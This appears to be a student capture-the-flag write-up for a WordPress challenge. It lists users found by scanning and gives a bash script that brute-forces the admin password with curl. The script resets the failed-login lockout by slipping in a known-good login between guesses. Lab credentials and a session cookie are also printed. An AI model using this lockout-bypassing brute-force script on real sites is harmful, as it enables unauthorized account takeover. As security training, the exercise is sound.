# CyberCTF_Assignment_3

### 7. Challenge: WordPress Website (Hard)

* The challenge requests to find the user names and passwords of the provided Website.
* With the tool “WPSscan” we scan the Website and get the associated users:
	* **“admin”**
	* **“think”**

![R3_C7_1](https://user-images.githubusercontent.com/124681007/217726362-db19feda-8185-4aa2-9722-955912b9c9d7.png)

![R3_C7_2](https://user-images.githubusercontent.com/124681007/217726419-6c06d2bb-1ee9-4552-ae97-867e1be98468.png)

* We can get the password hard-coded of the user “think” from the Webite files “123”.
* Now we have a way to get into the Website and in combination with the password list provided, we can automate the password search:

![R3_C7_3](https://user-images.githubusercontent.com/124681007/217726968-cf53b41a-718a-440d-9f8c-e0280a20af3a.png)

* The script has loop with a curl instruction to log on the Website, the localhost IP: **172.17.100.1**

		#!/bin/bash

		list=$1
		x=1
		RESPONSE=""

		#The user we know
		USR1="think"
		PASS1="123"
		#The user and password we are looking for on the list provided on $1
		USR2="admin"
		PASS2=""

		echo -e "\n" "Checking the password of the user "$USR2"..."

		while read -r line; do
			#Reading the file and assign it as a password on the variable PASS2
			PASS2=$line
				
			#The first attempt is with the user and password we know for a successful login that will reset the failed attempt counter
			RESPONSE=$(curl -i -s -k -X $'POST' \
			-H $'Host: localhost' -H $'Content-Length: 107' -H $'Cache-Control: max-age=0' -H $'sec-ch-ua: \"Chromium\";v=\"109\", \"Not_A Brand\";v=\"99\"' -H $'sec-ch-ua-mobile: ?0' -H $'sec-ch-ua-platform: \"Windows\"' -H $'Upgrade-Insecure-Requests: 1' -H $'Origin: http://localhost' -H $'Content-Type: application/x-www-form-urlencoded' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-User: ?1' -H $'Sec-Fetch-Dest: document' -H $'Referer: http://localhost/cybersec/wp-login.php' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9' -H $'Connection: close' \
				-b $'wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_ea3fd3d8b682fd160e70b2367abe99d8=think%7C1675444531%7CCWzWEGe9zeeApZ14ScLTgHtDjbIYvWu9KdidfzuXFOb%7C7f865bb96396cabc7c47a98ac5f55cefd5140a50224b0112e82fd3a1b5b8e287; wp-settings-time-2=1675271747' \
				--data-binary $'log='$USR1'&pwd='$PASS1'&wp-submit=Log+In&redirect_to=http%3A%2F%2Flocalhost%2Fcybersec%2Fwp-admin%2F&testcookie=1' \
				$'http://172.17.100.1/cybersec/wp-login.php' | grep -o "HTTP/1.1 302 Found")
	
			#This second attempt will try to login with the passwords provided for the second user
			RESPONSE=$(curl -i -s -k -X $'POST' \
			-H $'Host: localhost' -H $'Content-Length: 107' -H $'Cache-Control: max-age=0' -H $'sec-ch-ua: \"Chromium\";v=\"109\", \"Not_A Brand\";v=\"99\"' -H $'sec-ch-ua-mobile: ?0' -H $'sec-ch-ua-platform: \"Windows\"' -H $'Upgrade-Insecure-Requests: 1' -H $'Origin: http://localhost' -H $'Content-Type: application/x-www-form-urlencoded' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-User: ?1' -H $'Sec-Fetch-Dest: document' -H $'Referer: http://localhost/cybersec/wp-login.php' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9' -H $'Connection: close' \
				-b $'wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_ea3fd3d8b682fd160e70b2367abe99d8=think%7C1675444531%7CCWzWEGe9zeeApZ14ScLTgHtDjbIYvWu9KdidfzuXFOb%7C7f865bb96396cabc7c47a98ac5f55cefd5140a50224b0112e82fd3a1b5b8e287; wp-settings-time-2=1675271747' \
				--data-binary $'log='$USR2'&pwd='$PASS2'&wp-submit=Log+In&redirect_to=http%3A%2F%2Flocalhost%2Fcybersec%2Fwp-admin%2F&testcookie=1' \
				$'http://172.17.100.1/cybersec/wp-login.php' | grep -o "HTTP/1.1 302 Found")

			if [[ $RESPONSE == "HTTP/1.1 302 Found" ]]; then
				break
			fi
			x=$((x+1))
		done < <(grep "" $list)

		echo -e "\n     Response of successful login: "$RESPONSE
		echo -e "\n          Password found in line: = $x"
		echo "          The password is: = $PASS2"

* To void the security of the Website, we make a cycle with a successful login and another attempt with the password list until it gets a match.

> The password of the **“admin”** user is: **“#1mama”**
